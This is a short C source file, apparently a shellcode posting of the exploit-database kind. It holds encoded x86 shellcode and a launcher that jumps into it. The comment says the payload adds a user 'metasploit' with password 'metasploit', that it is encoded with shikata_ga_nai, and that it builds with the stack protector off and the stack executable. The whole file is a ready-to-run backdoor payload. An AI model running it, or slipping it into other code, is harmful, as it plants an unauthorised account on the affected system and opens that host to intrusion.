#include<stdio.h>
#include<string.h>

/*

Compilation: gcc -fno-stack-protector -z execstack shellcode2.c -o shellcode2
Execution: ./shellcode

Description: The shellcode adds a user metasploit having password metasploit.
	     The user can be removed by just removing /etc/passwd entry of
	     the metasploit user.
	     The shellcode is encode by x86/shikata_ga_nai encoder

*/

unsigned char shellcode[] =  \

"\xdb\xc6\xd9\x74\x24\xf4\x5f\x29\xc9\xb1\x19\xb8\x87\x13\xf9"
"\xb6\x31\x47\x18\x03\x47\x18\x83\xc7\x83\xf1\x0c\x87\x42\x7c"
"\x25\x82\x12\x27\x77\xd3\xf0\xd2\xdf\xe5\xcd\x8c\xb7\x76\xbe"
"\x59\x2c\x11\x6f\x89\xdc\x80\x07\xfa\x79\x37\xb4\x8d\x61\xf6"
"\x8f\x8a\xa8\x79\x7c\x7a\x1a\x7a\x82\x7b\x36\x1f\xf6\x1a\xbb"
"\xaf\x9a\xb3\x52\x24\x58\x0d\xdf\xeb\xf8\xc4\x6c\x9e\x34\xa7"
"\xa6\x17\x66\x24\xfd\x97\xbc\x9a\x3b\xe2\xef\xe0\x14\x70\x86"
"\x7a\x44\x07\x30\x89\xc3\x6c\x91\x71\x99\x76\x49\x47\xde\x1d"
"\x68\x0f\x12\x61";

main()
{
	
	printf("Shellcode length: %d\n",strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;

	ret();
	
}
